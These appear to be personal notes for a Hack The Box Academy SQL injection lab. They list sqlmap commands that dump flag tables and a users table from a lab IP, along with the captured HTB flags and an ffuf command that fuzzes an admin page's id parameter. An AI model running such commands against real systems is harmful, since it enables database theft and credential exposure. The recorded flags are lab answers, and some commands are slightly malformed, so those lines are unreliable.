```bash
# What's the contents of table flag2? (Case #2)
sqlmap  --batch --dump -T flag2 --forms --crawl=2
# HTB{700_much_c0n6r475_0n_p057_r3qu357}

# What's the contents of table flag3 (Case#3)
sqlmap -u 94.237.49.212:33817/case2.php --cookie='id=1*' --dump --batch -T flag3 --level=5 --risk=3
# HTB{c00k13_m0n573r_15_7h1nk1n6_0f_6r475}

# What's the contents of table flag4 (Case #4)
# sqlmap -r req.txt-u 94.237.49.212:33817/case2.php/?id=1
# HTB{j450n_v00rh335_53nd5_6r475}
```

```bash
# What's the contents of table flag1 in testdb database (Case #1)
sqlmap -u 94.237.49.212:33817/case1.php/ -D testdb -T flag1 --batch --dump --crawl 2
```

```bash
# What's the name of the column containing "style" in it's name (Case #1)
# sqlmap -u 94.237.49.212:33817/?id=1" --schema
sqlmap -u 94.237.49.212:33817/case1?id=1" --search -C style --random-agent

# What's the Kimberly user's password? (Case #1)
sqlmap -u 94.237.49.212:33817/?id=1" --dump -D -T users
```

```bash
# values generation 1 to 1000
for i in $(seq 1 1000); do echo $i >> ids.txt; done
```


```bash
# id value fuzzing
ffuf -w ids.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx
```
